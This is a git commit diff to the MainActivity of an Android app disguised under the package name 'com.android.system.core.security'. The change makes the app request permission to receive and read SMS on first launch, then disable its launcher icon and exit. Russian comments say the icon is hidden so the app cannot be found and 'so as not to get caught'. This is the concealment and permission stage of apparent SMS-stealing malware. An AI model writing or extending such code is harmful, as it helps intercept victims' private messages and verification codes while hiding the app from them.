1667e0e8ad38ab36c244b8c0a73d93b89fe19c4c
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-11 08:20:36 +0300

    Update MainActivity.java

--- app/src/main/java/com/android/system/core/security/MainActivity.java
+++ app/src/main/java/com/android/system/core/security/MainActivity.java
@@ -1,5 +1,6 @@
 package com.android.system.core.security;
 
+import android.Manifest;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.pm.PackageManager;
@@ -10,15 +11,26 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Скрываем иконку приложения после первого запуска, чтобы его нельзя было найти
-        try {
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            );
-        } catch (Exception e) {}
+        // Запрос прав для новых версий (на 14+ это неизбежно при первом ручном запуске)
+        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, 1);
+        } else {
+            hideAndExit();
+        }
+    }
 
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        hideAndExit();
+    }
+
+    private void hideAndExit() {
+        // Убираем иконку, чтобы не палиться
+        getPackageManager().setComponentEnabledSetting(
+            new ComponentName(this, MainActivity.class),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        );
         finish();
     }
 }
